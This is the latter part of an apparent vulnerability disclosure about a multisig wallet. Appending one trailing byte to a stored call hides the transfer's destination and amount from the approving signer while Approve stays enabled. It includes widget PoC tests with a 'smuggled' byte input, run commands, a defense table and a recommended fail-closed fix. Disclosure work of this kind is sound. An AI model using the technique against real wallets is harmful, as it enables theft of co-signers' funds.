  Future<void> pumpSheet(WidgetTester tester, List<int> callBytes) async {
    tester.view.physicalSize = const Size(1200, 1800);
    tester.view.devicePixelRatio = 1;
    addTearDown(tester.view.resetPhysicalSize);
    addTearDown(tester.view.resetDevicePixelRatio);

    await tester.pumpApp(
      Scaffold(
        body: MultisigActionConfirmSheet(
          msig: multisig,
          proposal: proposal(callBytes: callBytes),
          signer: signer,
          labels: MultisigConfirmSheetLabels(
            title: (_) => 'Approve proposal',
            body: (_) => 'Review the stored call',
            confirmLabel: (_) => 'Approve',
            dismissLabel: (_) => 'Cancel',
            authReason: (_) => 'Authenticate',
            failedMessage: (_) => 'Failed',
          ),
          loadCallBytes: (_) async => callBytes,
          estimateFee: (_, _, _) async => BigInt.one,
          buildCall: (_, bytes) => MultisigService().buildApproveCall(msig: multisig, proposalId: 7, call: bytes!),
          submit: (_, _, _, _) async {},
          submitExternal:
              (_, {required signer, required unsignedData, required signature, required publicKey, fee}) async =>
                  '0x01',
          logPrefix: '[TrailingBytesPoC]',
          hardwareTelemetryPrefix: 'trailing_bytes_poc',
          hardwareCacheIdentity: 'trailing-bytes-poc',
        ),
      ),
      overrides: [
        l10nProvider.overrideWithValue(lookupAppLocalizations(const Locale('en'))),
        settingsServiceProvider.overrideWithValue(_FakeSettingsService()),
        exchangeRateServiceProvider.overrideWithValue(ExchangeRateService(rates: const {})),
        numberFormattingServiceProvider.overrideWithValue(
          NumberFormattingService(localeConfig: LocaleNumberConfig.fromLocale('en_US')),
        ),
      ],
    );
    await tester.pumpAndSettle();
  }

  testWidgets('negative control: canonical bytes show transfer arguments before approval', (tester) async {
    await pumpSheet(tester, transfer.encode());

    expect(find.byType(DecodedCallView), findsOneWidget);
    expect(find.text('Destination'), findsOneWidget);
    expect(find.text('Amount'), findsOneWidget);

    final approve = tester.widget<QuantusButton>(find.widgetWithText(QuantusButton, 'Approve'));
    expect(approve.isDisabled, isFalse);
    expect(approve.onTap, isNotNull);
  });

  testWidgets('successful chain read plus display decode failure keeps Approve enabled', (tester) async {
    await pumpSheet(tester, smuggled);

    expect(find.text('Transfer allow death'), findsOneWidget);
    expect(find.text('Balances'), findsOneWidget);
    expect(find.byType(DecodedCallView), findsNothing);
    expect(find.text('Destination'), findsNothing);
    expect(find.text('Amount'), findsNothing);

    final approve = tester.widget<QuantusButton>(find.widgetWithText(QuantusButton, 'Approve'));
    expect(approve.isDisabled, isFalse);
    expect(approve.onTap, isNotNull);
  });
}
```

Run them:

```
cd src/quantus-apps/quantus_sdk
flutter test ../../../poc-tests/quantus_sdk/test/security/multisig_trailing_bytes_differential_test.dart ../../../poc-tests/quantus_sdk/test/security/indexer_trailing_byte_reachability_boundary_test.dart --reporter expanded

cd src/quantus-apps-history/mobile-app
flutter test ../../../poc-tests/mobile-app/test/security/multisig_trailing_bytes_wysiwys_test.dart --reporter expanded
```

Observed result: 7 passed, 0 failed.

## What the PoC proves

* `trailing_bytes_transfer_is_stored_approved_and_executed` proves the real pallet stores every submitted byte, enforces exact approval bytes, reaches threshold, dispatches the valid prefix, increases the attacker-controlled recipient by 1,000 units, and decreases the victim multisig by 1,000 units.
* `valid prefix plus residue is chain-decodable but app-undisplayable` proves the generated runtime codec accepts the prefix and leaves one byte while the production display decoder throws.
* The test named `consumer model retains an undecodable proposal row` proves that the app's real model keeps a constructed row active, retains `call_raw` and `decode_error`, and exposes no decoded arguments. It does not claim private-producer behavior.
* The two widget tests prove the control and attack UI states. Canonical bytes show `Destination` and `Amount`; the one-byte-residue case shows neither while **Approve** remains actionable.

## Defense traversal

* Membership: the attacker and victim are both valid signers. The attack does not bypass `NotASigner`.
* Threshold: the attacker supplies the first approval, and the victim supplies the second. The attack does not bypass threshold enforcement.
* Call binding: the victim approval carries the exact stored bytes. A changed trailing byte fails with `CallMismatch`, as the PoC asserts.
* Authentication: the victim completes the normal local authentication step, but authentication cannot repair hidden transaction arguments.
* On-chain reload: the app successfully reloads the authoritative bytes. The bug occurs after that security check, when display decoding fails without blocking confirmation.
* Execution checks: the pallet rechecks expiry, call weight, and high-security policy before dispatch. A normal balance transfer satisfies those checks.

The auxiliary approval extrinsic is dispatched through the real Substrate block path and passes signer membership, threshold, expiry, weight, high-security, and exact-call checks. The payload reaches the impact surface at `pallets/multisig/src/lib.rs:1154-1156`.

## Protocol-Owned Defenses Considered

| Defense                  | Expected protection                      | PoC or source result                                                                                                          | Outcome                              |
| ------------------------ | ---------------------------------------- | ----------------------------------------------------------------------------------------------------------------------------- | ------------------------------------ |
| Signer membership        | Reject non-members                       | Attacker and victim are valid members; `approve` still requires the victim                                                    | attacker wins despite defense        |
| Threshold                | Prevent one signer from spending         | Attacker supplies approval one, and the hidden-argument victim approval supplies approval two                                 | attacker wins despite defense        |
| Exact call binding       | Prevent approval of different bytes      | The PoC proves changed residue fails and exact residue passes at `pallets/multisig/src/lib.rs:779-781`                        | attacker wins despite defense        |
| App chain reload         | Replace untrusted display bytes          | Reload succeeds, then strict decoding fails without setting the blocking flag at `multisig_action_confirm_sheet.dart:158-194` | attacker wins despite defense        |
| Local authentication     | Confirm a local user action              | Authentication authorizes the hidden-argument approval; it does not reveal call fields                                        | attacker wins despite defense        |
| Expiry and weight checks | Reject stale or overweight calls         | The normal transfer meets both checks at `pallets/multisig/src/lib.rs:1114-1134`                                              | attacker wins despite defense        |
| High-security policy     | Restrict calls for opted-in accounts     | The claim is limited to ordinary multisigs where the normal transfer is allowed at `pallets/multisig/src/lib.rs:1137-1143`    | attacker wins on the claimed surface |
| Cancel                   | Let the proposer cancel before execution | The attacker who proposed the call has no incentive to cancel, and the victim cannot reverse an executed balance transfer     | attacker wins despite defense        |

Opposed path review covers the claimed ordinary two-of-two multisig path. No watchtower, refund, liquidation, slash, challenge, or finalizer exists on this call path. The vulnerable runtime family is fixed by the frozen source pin. Private processor behavior selects one of the two disclosed discovery outcomes.

## Negative control

The SDK and widget suites use canonical bytes as the control. The same transfer without the appended byte decodes with zero residue, renders `Destination` and `Amount`, and gives the victim the full information needed to decide. Adding one byte changes only the wallet's display result, not the call prefix dispatched by the pallet.

The pallet test also changes the final byte before approval and confirms that the chain rejects the mismatched vector. This rules out a generic approval-binding bypass. The vulnerable condition is the exact non-canonical vector accepted by the chain but rejected only by the wallet's display decoder.

## Recommended fix

Fail closed whenever authoritative stored call bytes load but `CallDecoder.decodeBytes` rejects them. Track semantic decode failure separately from byte-load failure, show a clear error, and disable approval and execution.

Also restore a raw-byte review path for advanced users. Chain commit `6f7094f0` already closes this exact proposal input by requiring canonical round-trip encoding. The app fix remains necessary as a defense-in-depth authorization invariant because users should never authorize any call whose authoritative arguments the wallet cannot render.
